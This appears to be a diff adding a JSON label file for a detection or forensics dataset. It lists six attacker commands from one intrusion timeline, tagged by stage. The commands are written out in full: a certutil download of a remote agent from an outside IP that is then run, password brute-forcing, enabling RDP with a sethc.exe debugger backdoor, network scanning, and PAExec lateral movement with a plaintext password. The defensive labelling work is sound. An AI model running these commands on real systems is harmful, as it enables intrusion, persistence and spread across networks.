@@ -1,0 +1,62 @@
+[
+  {
+    "id": "A1",
+    "stage": "Initial Access",
+    "match_substring": "ping www.baidu.com -c 1",
+    "full_command": "whoami&arp -a&ipconfig&ping www.baidu.com -c 1",
+    "file_path": null,
+    "occurTime_start": "2022-03-18 16:45:42",
+    "occurTime_end": "2022-03-18 16:45:47",
+    "hostIp": "192.168.0.95"
+  },
+  {
+    "id": "A2",
+    "stage": "Initial Access",
+    "match_substring": "sangforcat.exe",
+    "full_command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe&cmd /c start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 2f9c7075-ec33-4a29-901a-8e383f395763 -server https://124.223.85.207:8443\"",
+    "file_path": null,
+    "occurTime_start": "2022-03-18 16:45:42",
+    "occurTime_end": "2022-03-18 16:46:23",
+    "hostIp": "192.168.0.95"
+  },
+  {
+    "id": "A3",
+    "stage": "Credential Access",
+    "match_substring": "WinBrute.exe",
+    "full_command": "WinBrute.exe administrator_pass.txt administrator",
+    "file_path": "C:\\Users\\Public\\WinBrute.exe",
+    "occurTime_start": "2022-03-18 16:46:49",
+    "occurTime_end": "2022-03-18 16:46:51",
+    "hostIp": "192.168.0.95"
+  },
+  {
+    "id": "A4",
+    "stage": "Persistence",
+    "match_substring": "Execution Options\\\\sethc.exe",
+    "full_command": "reg add \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\";REG ADD \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\\\windows\\\\system32\\\\cmd.exe\" /f ; REG query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\"",
+    "file_path": null,
+    "occurTime_start": "2022-03-18 16:46:59",
+    "occurTime_end": "2022-03-18 16:47:00",
+    "hostIp": "192.168.0.95"
+  },
+  {
+    "id": "A5",
+    "stage": "Discovery",
+    "match_substring": "nbtscan.exe",
+    "full_command": "nbtscan.exe 192.168.0.244/24",
+    "file_path": "C:\\Users\\Public\\nbtscan.exe",
+    "occurTime_start": "2022-03-18 16:47:09",
+    "occurTime_end": "2022-03-18 16:47:16",
+    "hostIp": "192.168.0.95"
+  },
+  {
+    "id": "A6",
+    "stage": "Lateral Movement",
+    "match_substring": "PAExec.exe \\\\192.168.0.244",
+    "full_command": "PAExec.exe \\\\192.168.0.244 -u administrator -p Data123456! ipconfig",
+    "file_path": "C:\\Users\\Public\\PAExec.exe",
+    "occurTime_start": "2022-03-18 16:47:20",
+    "occurTime_end": "2022-03-18 16:47:39",
+    "hostIp": "192.168.0.95"
+  }
+]
